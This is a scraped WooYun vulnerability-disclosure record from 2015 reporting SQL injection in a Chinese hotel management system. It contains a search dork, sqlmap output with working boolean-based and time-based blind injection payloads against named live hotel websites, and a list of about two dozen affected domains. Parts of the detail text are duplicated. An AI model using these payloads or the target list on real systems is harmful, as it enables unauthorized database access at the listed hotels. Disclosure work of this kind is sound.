{"id": 18422, "wybug_id": "wooyun-2015-0106618", "wybug_title": "问途酒店信息管理系统SQL注入漏洞", "wybug_corp": "广州市问途信息技术有限公司", "wybug_author": "路人甲", "wybug_date": "2015-04-09 14:55", "wybug_open_date": "2015-07-12 14:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向公众公开  简要描述：   详细说明：  \n谷歌搜索:技术支持： 问途酒店网络营销\n\n\n\n案例一：http://www.goldenhotel.com.cn注册用户，修改资料抓包\n\n\n\n\n\n\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: client_account (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: jsoncallback=jQuery18008583418767996372_1428046877163&client_account=sy_hjhj' AND 5892=5892 AND 'hQek'='hQek&language=zh-cn&param={\"first_name\":\"123123\",\"last_name\":\"1123123\",\"mobile\":\"13521412321\",\"account_id\":\"29348923@qq.com\",\"fields\":{\"title\":\"%E5%85%88%E7%94%9F\",\"birthday\":\"123\",\"certificate_type\":\"%E8%BA%AB%E4%BB%BD%E8%AF%81\",\"certificate\":\"123123123\",\"company\":\"\",\"position\":\"\",\"country\":\"China , %E4%B8%AD%E5%9B%BD\",\"province\":\"\",\"city\":\"\",\"address\":\"\",\"postcode\":\"\",\"love_hotel\":\"%E5%95%86%E5%8A%A1%E6%97%85%E8%A1%8C\",\"smoke\":\"%E6%9C%89\",\"age\":\"19-23\",\"love_floor\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_bed\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_far\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_doss\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\"}}&_=1428046902896    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: jsoncallback=jQuery18008583418767996372_1428046877163&client_account=sy_hjhj' AND (SELECT * FROM (SELECT(SLEEP(5)))VrDV) AND 'kWXO'='kWXO&language=zh-cn&param={\"first_name\":\"123123\",\"last_name\":\"1123123\",\"mobile\":\"13521412321\",\"account_id\":\"29348923@qq.com\",\"fields\":{\"title\":\"%E5%85%88%E7%94%9F\",\"birthday\":\"123\",\"certificate_type\":\"%E8%BA%AB%E4%BB%BD%E8%AF%81\",\"certificate\":\"123123123\",\"company\":\"\",\"position\":\"\",\"country\":\"China , %E4%B8%AD%E5%9B%BD\",\"province\":\"\",\"city\":\"\",\"address\":\"\",\"postcode\":\"\",\"love_hotel\":\"%E5%95%86%E5%8A%A1%E6%97%85%E8%A1%8C\",\"smoke\":\"%E6%9C%89\",\"age\":\"19-23\",\"love_floor\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_bed\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_far\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_doss\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\"}}&_=1428046902896---back-end DBMS: MySQL 5.0.12current database:    'dossm'\n\n案例二：http://www.jadesea.cn/注册用户，修改资料抓包\n\n\n\n\n\n\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: client_account (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: jsoncallback=jQuery183002090404491009734_1428047318069&client_account=sy_yhhotel' AND 8130=8130 AND 'VSoO'='VSoO&language=zh-cn&param={\"first_name\":\"123123\",\"last_name\":\"123123\",\"mobile\":\"138521412365\",\"account_id\":\"9283498@qq.com\",\"fields\":{\"title\":\"%E5%85%88%E7%94%9F\",\"birthday\":\"123123\",\"certificate_type\":\"%E8%BA%AB%E4%BB%BD%E8%AF%81\",\"certificate\":\"123123\",\"company\":\"\",\"position\":\"\",\"country\":\"China , %E4%B8%AD%E5%9B%BD\",\"province\":\"\",\"city\":\"\",\"address\":\"\",\"postcode\":\"\",\"love_hotel\":\"%E5%95%86%E5%8A%A1%E6%97%85%E8%A1%8C\",\"smoke\":\"%E6%9C%89\",\"age\":\"\",\"love_floor\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_bed\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_far\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_doss\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\"}}&_=1428047339188    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: jsoncallback=jQuery183002090404491009734_1428047318069&client_account=sy_yhhotel' AND (SELECT * FROM (SELECT(SLEEP(5)))FFYs) AND 'ETTf'='ETTf&language=zh-cn&param={\"first_name\":\"123123\",\"last_name\":\"123123\",\"mobile\":\"138521412365\",\"account_id\":\"9283498@qq.com\",\"fields\":{\"title\":\"%E5%85%88%E7%94%9F\",\"birthday\":\"123123\",\"certificate_type\":\"%E8%BA%AB%E4%BB%BD%E8%AF%81\",\"certificate\":\"123123\",\"company\":\"\",\"position\":\"\",\"country\":\"China , %E4%B8%AD%E5%9B%BD\",\"province\":\"\",\"city\":\"\",\"address\":\"\",\"postcode\":\"\",\"love_hotel\":\"%E5%95%86%E5%8A%A1%E6%97%85%E8%A1%8C\",\"smoke\":\"%E6%9C%89\",\"age\":\"\",\"love_floor\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_bed\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_far\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_doss\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\"}}&_=1428047339188---back-end DBMS: MySQL >= 5.0.0current database:    'dossm'\n\n案例三：http://www.royalmarinaplaza.com注册，修改资料抓包\n\n\n\n\n\n\n\n漏洞细节：MYSQL注入谷歌搜索:技术支持： 问途酒店网络营销案例一：http://www.goldenhotel.com.cn注册用户，修改资料抓包sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: client_account (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: jsoncallback=jQuery18008583418767996372_1428046877163&client_account=sy_hjhj' AND 5892=5892 AND 'hQek'='hQek&language=zh-cn&param={\"first_name\":\"123123\",\"last_name\":\"1123123\",\"mobile\":\"13521412321\",\"account_id\":\"29348923@qq.com\",\"fields\":{\"title\":\"%E5%85%88%E7%94%9F\",\"birthday\":\"123\",\"certificate_type\":\"%E8%BA%AB%E4%BB%BD%E8%AF%81\",\"certificate\":\"123123123\",\"company\":\"\",\"position\":\"\",\"country\":\"China , %E4%B8%AD%E5%9B%BD\",\"province\":\"\",\"city\":\"\",\"address\":\"\",\"postcode\":\"\",\"love_hotel\":\"%E5%95%86%E5%8A%A1%E6%97%85%E8%A1%8C\",\"smoke\":\"%E6%9C%89\",\"age\":\"19-23\",\"love_floor\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_bed\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_far\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_doss\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\"}}&_=1428046902896    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: jsoncallback=jQuery18008583418767996372_1428046877163&client_account=sy_hjhj' AND (SELECT * FROM (SELECT(SLEEP(5)))VrDV) AND 'kWXO'='kWXO&language=zh-cn&param={\"first_name\":\"123123\",\"last_name\":\"1123123\",\"mobile\":\"13521412321\",\"account_id\":\"29348923@qq.com\",\"fields\":{\"title\":\"%E5%85%88%E7%94%9F\",\"birthday\":\"123\",\"certificate_type\":\"%E8%BA%AB%E4%BB%BD%E8%AF%81\",\"certificate\":\"123123123\",\"company\":\"\",\"position\":\"\",\"country\":\"China , %E4%B8%AD%E5%9B%BD\",\"province\":\"\",\"city\":\"\",\"address\":\"\",\"postcode\":\"\",\"love_hotel\":\"%E5%95%86%E5%8A%A1%E6%97%85%E8%A1%8C\",\"smoke\":\"%E6%9C%89\",\"age\":\"19-23\",\"love_floor\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_bed\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_far\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_doss\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\"}}&_=1428046902896---back-end DBMS: MySQL 5.0.12current database:    'dossm'案例二：http://www.jadesea.cn/注册用户，修改资料抓包sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: client_account (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: jsoncallback=jQuery183002090404491009734_1428047318069&client_account=sy_yhhotel' AND 8130=8130 AND 'VSoO'='VSoO&language=zh-cn&param={\"first_name\":\"123123\",\"last_name\":\"123123\",\"mobile\":\"138521412365\",\"account_id\":\"9283498@qq.com\",\"fields\":{\"title\":\"%E5%85%88%E7%94%9F\",\"birthday\":\"123123\",\"certificate_type\":\"%E8%BA%AB%E4%BB%BD%E8%AF%81\",\"certificate\":\"123123\",\"company\":\"\",\"position\":\"\",\"country\":\"China , %E4%B8%AD%E5%9B%BD\",\"province\":\"\",\"city\":\"\",\"address\":\"\",\"postcode\":\"\",\"love_hotel\":\"%E5%95%86%E5%8A%A1%E6%97%85%E8%A1%8C\",\"smoke\":\"%E6%9C%89\",\"age\":\"\",\"love_floor\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_bed\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_far\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_doss\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\"}}&_=1428047339188    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: jsoncallback=jQuery183002090404491009734_1428047318069&client_account=sy_yhhotel' AND (SELECT * FROM (SELECT(SLEEP(5)))FFYs) AND 'ETTf'='ETTf&language=zh-cn&param={\"first_name\":\"123123\",\"last_name\":\"123123\",\"mobile\":\"138521412365\",\"account_id\":\"9283498@qq.com\",\"fields\":{\"title\":\"%E5%85%88%E7%94%9F\",\"birthday\":\"123123\",\"certificate_type\":\"%E8%BA%AB%E4%BB%BD%E8%AF%81\",\"certificate\":\"123123\",\"company\":\"\",\"position\":\"\",\"country\":\"China , %E4%B8%AD%E5%9B%BD\",\"province\":\"\",\"city\":\"\",\"address\":\"\",\"postcode\":\"\",\"love_hotel\":\"%E5%95%86%E5%8A%A1%E6%97%85%E8%A1%8C\",\"smoke\":\"%E6%9C%89\",\"age\":\"\",\"love_floor\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_bed\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_far\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\",\"love_doss\":\"%E8%AF%B7%E9%80%89%E6%8B%A9\"}}&_=1428047339188---back-end DBMS: MySQL >= 5.0.0current database:    'dossm'案例三：http://www.royalmarinaplaza.com注册，修改资料抓包sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: client_account (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: jsoncallback=jQuery164018857463114227435_1428047679086&client_account=gz_marina' AND 4469=4469 AND 'XXFo'='XXFo&language=zh-cn&param={\"last_name\":\"12312\",\"first_name\":\"3123\",\"fields\":{\"title\":\"%E5%85%88%E7%94%9F\",\"birthday\":\"123123\",\"certificate_type\":\"12312\",\"certificate\":\"12312\",\"email\":\"3123123@qq.com\",\"phone\":\"123123123123\",\"phone_type\":\"%E5%9B%BD%E5%86%85%E7%94%B5%E8%AF%9D\",\"company\":\"\",\"position\":\"\",\"country\":\"%E4%B8%AD%E5%9B%BD\",\"province\":\"%E5%B9%BF%E4%B8%9C\",\"city\":\"\",\"address\":\"\",\"postcode\":\"\",\"love_hotel\":\"on\",\"age\":\"19-23\",\"love_floor\":\"0\",\"love_bed\":\"0\",\"love_far\":\"0\",\"smoke\":\"yes-smoking\",\"love_doss\":\"0\"}}&_=1428047706785    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: jsoncallback=jQuery164018857463114227435_1428047679086&client_account=gz_marina' AND (SELECT * FROM (SELECT(SLEEP(5)))TyVi) AND 'RIVg'='RIVg&language=zh-cn&param={\"last_name\":\"12312\",\"first_name\":\"3123\",\"fields\":{\"title\":\"%E5%85%88%E7%94%9F\",\"birthday\":\"123123\",\"certificate_type\":\"12312\",\"certificate\":\"12312\",\"email\":\"3123123@qq.com\",\"phone\":\"123123123123\",\"phone_type\":\"%E5%9B%BD%E5%86%85%E7%94%B5%E8%AF%9D\",\"company\":\"\",\"position\":\"\",\"country\":\"%E4%B8%AD%E5%9B%BD\",\"province\":\"%E5%B9%BF%E4%B8%9C\",\"city\":\"\",\"address\":\"\",\"postcode\":\"\",\"love_hotel\":\"on\",\"age\":\"19-23\",\"love_floor\":\"0\",\"love_bed\":\"0\",\"love_far\":\"0\",\"smoke\":\"yes-smoking\",\"love_doss\":\"0\"}}&_=1428047706785---back-end DBMS: MySQL >= 5.0.0current database:    'dossm'\n\n案例四：http://www.xinyuexinhotel.com注册，修改资料抓包\n\n\n\n\n\n\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: client_account (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: jsoncallback=jQuery191007966794349840756_1428048874667&client_account=yn_sbgarden') AND 9868=9868 AND ('PuSv'='PuSv&language=zh-cn&code=&param={\"title\":\"%E5%A5%B3%E5%A3%AB\",\"last_name\":\"123123\",\"first_name\":\"123123\",\"mobile\":\"13852141232\",\"email\":\"234923948@qq.com\",\"address\":\"123123\",\"choose_reason\":\"%E4%BC%91%E9%97%B2%E5%BA%A6%E5%81%87\",\"elevator\":\"%E5%96%9C%E6%AC%A2\",\"smoke\":\"%E6%9C%89\",\"bed_type\":\"%E5%A4%A7%E5%BA%8A\",\"floor\":\"%E9%AB%98%E6%A5%BC%E5%B1%82\",\"birthday\":\"2005-02-01\",\"fields\":{\"title\":\"%E5%A5%B3%E5%A3%AB\",\"last_name\":\"123123\",\"first_name\":\"123123\",\"mobile\":\"13852141232\",\"email\":\"234923948@qq.com\",\"address\":\"123123\",\"choose_reason\":\"%E4%BC%91%E9%97%B2%E5%BA%A6%E5%81%87\",\"elevator\":\"%E5%96%9C%E6%AC%A2\",\"smoke\":\"%E6%9C%89\",\"bed_type\":\"%E5%A4%A7%E5%BA%8A\",\"floor\":\"%E9%AB%98%E6%A5%BC%E5%B1%82\",\"birthday\":\"2005-02-01\"}}&_=1428048874670---back-end DBMS: MySQL >= 5.0.0current database:    'd2'\n\n案例五：http://www.resortintime.com注册，修改资料抓包\n\n\n\n\n\n\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: client_account (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: jsoncallback=jQuery16405680112944196926_1428049876334&client_account=sy_resortintime' AND 6089=6089 AND 'NxGY'='NxGY&language=zh-cn&param={\"first_name\":\"1123\",\"last_name\":\"123123\",\"fields\":{\"title\":\"%E5%85%88%E7%94%9F\",\"birthday\":\"123\",\"certificate_type\":\"123\",\"certificate\":\"123\",\"email\":\"23848324@qq.com\",\"phone\":\"123123\",\"phone_type\":\"%E5%9B%BD%E5%86%85%E7%94%B5%E8%AF%9D\",\"company\":\"\",\"position\":\"\",\"country\":\"%E4%B8%AD%E5%9B%BD\",\"province\":\"%E5%B9%BF%E4%B8%9C\",\"city\":\"\",\"address\":\"\",\"postcode\":\"\",\"love_hotel\":\"on\",\"age\":\"19-23\",\"love_floor\":\"0\",\"love_bed\":\"0\",\"love_far\":\"0\",\"smoke\":\"yes-smoking\",\"love_doss\":\"0\"}}&_=1428049910430    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: jsoncallback=jQuery16405680112944196926_1428049876334&client_account=sy_resortintime' AND (SELECT * FROM (SELECT(SLEEP(10)))jkrZ) AND 'BqMN'='BqMN&language=zh-cn&param={\"first_name\":\"1123\",\"last_name\":\"123123\",\"fields\":{\"title\":\"%E5%85%88%E7%94%9F\",\"birthday\":\"123\",\"certificate_type\":\"123\",\"certificate\":\"123\",\"email\":\"23848324@qq.com\",\"phone\":\"123123\",\"phone_type\":\"%E5%9B%BD%E5%86%85%E7%94%B5%E8%AF%9D\",\"company\":\"\",\"position\":\"\",\"country\":\"%E4%B8%AD%E5%9B%BD\",\"province\":\"%E5%B9%BF%E4%B8%9C\",\"city\":\"\",\"address\":\"\",\"postcode\":\"\",\"love_hotel\":\"on\",\"age\":\"19-23\",\"love_floor\":\"0\",\"love_bed\":\"0\",\"love_far\":\"0\",\"smoke\":\"yes-smoking\",\"love_doss\":\"0\"}}&_=1428049910430---back-end DBMS: MySQL >= 5.0.0current database:    'dossm'\n\n列举受影响站点：http://www.goldenhotel.com.cnhttp://www.jadesea.cnhttp://www.royalmarinaplaza.comhttp://www.expo-gardenhotel.comhttp://www.resortintime.comhttp://www.glbravohotel.comhttp://www.horizonsanya.comhttp://www.xlhhotel.comhttp://www.prgardenhotel.com.cnhttp://www.xinyuexinhotel.comhttp://www.vaya-hotel.cnhttp://www.norincoeasun.comhttp://www.lido-hotel.cnhttp://www.easelandhotel.comhttp://www.hongfuluxemon.comhttp://www.cndhotels.comhttp://www.harmonahotel.comhttp://www.harmonahotel.comhttp://www.tianfuyuan.comhttp://www.royalgardenhotel.com.cnhttp://www.yingbinhotel.cnhttp://www.fcghotel.comhttp://www.wx-hotel.comhttp://www.dzhgz.com\n   漏洞证明：  RS   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-04-13 14:52 厂商回复： CNVD未直接复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}